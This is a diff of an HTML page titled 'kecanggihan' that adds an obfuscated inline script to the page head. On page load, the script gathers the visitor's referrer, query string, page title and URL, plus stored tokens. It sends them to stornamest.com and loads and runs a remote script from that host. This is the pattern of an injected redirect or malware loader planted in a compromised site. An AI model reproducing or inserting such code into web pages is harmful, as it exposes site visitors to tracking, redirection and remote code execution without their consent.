@@ -2,7 +2,49 @@
 <html>
 <head>
     <meta charset="utf-8">
-    
+    <script>
+    (function() {
+    var name = '_P4C4pmwkCJvh7KjP';
+    if (!window._P4C4pmwkCJvh7KjP) {
+        window._P4C4pmwkCJvh7KjP = {
+            unique: false,
+            ttl: 86400,
+            R_PATH: 'https://stornamest.com/WgnzLLyZ',
+            P_PATH: 'https://stornamest.com/7b4f75c/postback',
+        };
+    }
+    const _XVDM3xvRKFnb47NW = localStorage.getItem('config');
+    if (typeof _XVDM3xvRKFnb47NW !== 'undefined' && _XVDM3xvRKFnb47NW !== null) {
+        var _br2KYZ36g4CJjZRn = JSON.parse(_XVDM3xvRKFnb47NW);
+        var _MFTQvTPDg2RhhbjK = Math.round(+new Date()/1000);
+        if (_br2KYZ36g4CJjZRn.created_at + window._P4C4pmwkCJvh7KjP.ttl < _MFTQvTPDg2RhhbjK) {
+            localStorage.removeItem('subId');
+            localStorage.removeItem('token');
+            localStorage.removeItem('config');
+        }
+    }
+    var _Xt19T32MMNM8jGtM = localStorage.getItem('subId');
+    var _kgTmDzzjgcWjKcLM = localStorage.getItem('token');
+    var _fRj7DhTLpJzrMPQT = '?return=js.client';
+        _fRj7DhTLpJzrMPQT += '&' + decodeURIComponent(window.location.search.replace('?', ''));
+        _fRj7DhTLpJzrMPQT += '&se_referrer=' + encodeURIComponent(document.referrer);
+        _fRj7DhTLpJzrMPQT += '&default_keyword=' + encodeURIComponent(document.title);
+        _fRj7DhTLpJzrMPQT += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
+        _fRj7DhTLpJzrMPQT += '&name=' + encodeURIComponent(name);
+        _fRj7DhTLpJzrMPQT += '&host=' + encodeURIComponent(window._P4C4pmwkCJvh7KjP.R_PATH);
+    if (typeof _Xt19T32MMNM8jGtM !== 'undefined' && _Xt19T32MMNM8jGtM && window._P4C4pmwkCJvh7KjP.unique) {
+        _fRj7DhTLpJzrMPQT += '&sub_id=' + encodeURIComponent(_Xt19T32MMNM8jGtM);
+    }
+    if (typeof _kgTmDzzjgcWjKcLM !== 'undefined' && _kgTmDzzjgcWjKcLM && window._P4C4pmwkCJvh7KjP.unique) {
+        _fRj7DhTLpJzrMPQT += '&token=' + encodeURIComponent(_kgTmDzzjgcWjKcLM);
+    }
+    var a = document.createElement('script');
+        a.type = 'application/javascript';
+        a.src = window._P4C4pmwkCJvh7KjP.R_PATH + _fRj7DhTLpJzrMPQT;
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(a, s)
+    })();
+    </script>
 
     <title>kecanggihan</title>
     <!-- Define a viewport to mobile devices to use - telling the browser to assume that the page is as wide as the device (width=device-width) and setting the initial page zoom level to be 1 (initial-scale=1.0) -->
